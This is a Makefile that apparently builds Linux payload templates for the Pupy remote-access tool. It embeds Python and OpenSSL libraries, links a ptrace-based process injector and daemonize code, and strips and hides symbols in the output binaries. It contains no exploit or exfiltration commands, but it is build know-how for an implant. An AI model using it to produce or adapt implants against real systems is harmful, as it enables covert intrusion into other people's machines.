CC ?= gcc

OS ?= $(shell uname -s)
SUFFIX ?= $(shell echo $(OS) | cut -c -3 | tr '[:upper:]' '[:lower:]')

STATIC_LIBZ := -Wl,-Bstatic -lz -Wl,-Bdynamic
# STATIC_LIBZ := -lz

CFLAGS := $(shell pkg-config --cflags python-2.7) -I. -I../common -fPIC $(CFLAGS_EXTRA) -pipe -Wall
LDFLAGS := $(LDFLAGS) $(STATIC_LIBZ) -lpthread -ldl -fPIC $(LDFLAGS_EXTRA)
PFLAGS := -OO
PIE ?= -pie

CFLAGS += -D$(OS) -std=gnu99

ifeq ($(OPENSSL_LIB_VERSION),)
OPENSSL_LIB_VERSION := 1.0.0
endif

CFLAGS += "-DOPENSSL_LIB_VERSION=\"$(OPENSSL_LIB_VERSION)\""

ifeq ($(LIBPYTHON),)
LIBPYTHON := $(shell /sbin/ldconfig -p  | awk '/libpython2.7.so/{print $$4}' | head -n 1)
endif

ifeq ($(LIBCRYPTO),)
LIBCRYPTO := $(shell /sbin/ldconfig -p  | awk '/libcrypto.so.$(OPENSSL_LIB_VERSION)/{print $$4}' | head -n 1)
endif

ifeq ($(LIBSSL),)
LIBSSL := $(shell /sbin/ldconfig -p  | awk '/libssl.so.$(OPENSSL_LIB_VERSION)/{print $$4}' | head -n 1)
endif

XZARGS ?= "gcc" "aligned(0x1000)" 'section(".xzrodata")'

ifeq ($(ARCH),)
ARCH ?= $(shell file $(LIBPYTHON) | grep 32-bit >/dev/null && echo 32 || echo 64)
endif

ifeq ($(ARCH),64)
NAME := 64
LDFLAGS += -m64
ifeq ($(DEBUG),)
CFLAGS += -fvisibility=hidden
endif
else
NAME := 86
CFLAGS += -D_FILE_OFFSET_BITS=64
endif

CFLAGS += -Iresources/$(ARCH) -Iresources

LINUX_INJECT_CFLAGS := -include fixes.h -Iinjector/src/linux

ifneq ($(DEBUG),)
DEBUG_ADD := -debug
CFLAGS += -DDEBUG -O0 -g
LDFLAGS += -g
NAME   := "$(NAME)d"
else
CFLAGS += -Os
ifeq ($(OS),Linux)
LDFLAGS += -O1 -Wl,-s -Wl,-x -Wl,--gc-sections -Wl,--no-undefined
LDFLAGS += -Wl,-z,now -Wl,-z,combreloc -Wl,--enable-new-dtags
else
LDFLAGS += -s
endif
endif

PYTHON ?= python
TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/

PYOBJS := pupy_load.o
SHARED_OBJS := main_so.o pupy_shared.o tmplibrary_lmid.o
APP_OBJS := main_exe.o pupy.o tmplibrary.o
COMMON_OBJS := list.o daemonize.o decompress.o

ifneq ($(DEBUG),)
COMMON_OBJS += debug.o
endif

ifeq ($(UNCOMPRESSED),)
COMMON_OBJS += LzmaDec.o
COMPRESSED = 1
else
CFLAGS += -DUNCOMPRESSED
SUFFIX := unc.$(SUFFIX)
COMPRESSED = 0
endif

ifeq ($(OS),Linux)
COMMON_OBJS += injector/src/linux/elf.o
COMMON_OBJS += injector/src/linux/injector.o
COMMON_OBJS += injector/src/linux/ptrace.o
COMMON_OBJS += injector/src/linux/remote_call.o
COMMON_OBJS += injector/src/linux/util.o
COMMON_OBJS += fixes.o

CFLAGS += -Iinjector/include
LDFLAGS += -Wl,-wrap,realpath
endif

all: $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX) $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so

revision.h:
	if [ x"$$COMMIT" = x"" ]; then rev=`cat ../../.git/\`cat ../../.git/HEAD | cut -f 2 -d \ \` | cut -c 1-8`; \
		else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

list.o: ../common/list.c ../common/list.h
	$(CC) -c -o $@ $< $(CFLAGS)

debug.o: ../common/debug.c ../common/debug.h
	$(CC) -c -o $@ $< $(CFLAGS)

pupy.o: pupy.c revision.h ../common/Python-dynload.h import-tab.h

pupy_shared.o: pupy.c revision.h ../common/jni_on_load.c ../common/Python-dynload.h import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS) -D_PUPY_SO

pupy_load.o: pupy_load.c \
	resources/$(ARCH)/libssl.c resources/$(ARCH)/libcrypto.c \
	resources/$(ARCH)/python27.c \
	resources/$(ARCH)/library.c \
	../common/Python-dynload.c ../common/Python-dynload.h \
	../common/Python-dynload.c ../common/Python-dynload.h \
	../common/LzmaDec.c ../common/LzmaDec.h ../common/lzmaunpack.c \
	revision.h

tmplibrary_lmid.o: tmplibrary.c
	$(CC) -c -o $@ $< $(CFLAGS) -DWIP_LMID

import-tab.c import-tab.h: ../mktab.py
	$(PYTHON) $(PFLAGS) $<

Python-dynload.o: Python-dynload.c import-tab.c import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS)

ifeq ($(UNCOMPRESSED),)
LzmaDec.o: ../common/LzmaDec.c
	$(CC) $(CFLAGS) -O3 -fPIC -c -o $@ $<
endif

resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(ARCH)/library.zip
	$(PYTHON) $(PFLAGS) ../gen_library_compressed_string.py $@ resources/$(ARCH)/library.zip

resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
	$(PYTHON) $(PFLAGS) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(XZARGS)


injector/%.o: injector/%.c
	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<

resources/$(ARCH)/python27.so: $(LIBPYTHON)
	@mkdir -p resources/$(ARCH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	sed $@.tmp -e 's@/tmp@\x00tmp@g;s@/usr@\x00usr@g' >$@ || ( rm -f $@; cp $@.tmp $@ )
	rm -f $@.tmp

resources/$(ARCH)/libcrypto.so: $(LIBCRYPTO)
	@mkdir -p resources/$(ARCH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(ARCH)/libssl.so: $(LIBSSL)
	@mkdir -p resources/$(ARCH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(ARCH)/library.zip: ../build_library_zip.py ../additional_imports.py
	$(PYTHON) -OO $(PFLAGS) $< $@

resources/$(ARCH)/python27.c: ../gen_resource_header.py resources/$(ARCH)/python27.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(ARCH)/libssl.c: ../gen_resource_header.py resources/$(ARCH)/libssl.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(ARCH)/libcrypto.c: ../gen_resource_header.py resources/$(ARCH)/libcrypto.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX): $(APP_OBJS) $(PYOBJS) $(COMMON_OBJS)
	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so: $(SHARED_OBJS) $(PYOBJS) $(COMMON_OBJS)
	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupyx$(NAME).$(SUFFIX).so

.PHONY: clean all

clean:
	rm -f $(COMMON_OBJS) $(PYOBJS)
	rm -f pupy pupy.so
	rm -f *.o

distclean: clean
	rm -f resources/*.c
	rm -f resources/$(ARCH)/*.c
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f revision.h
	rm -rf resources

$(COMMON_OBJS) $(PYOBJS): import-tab.h
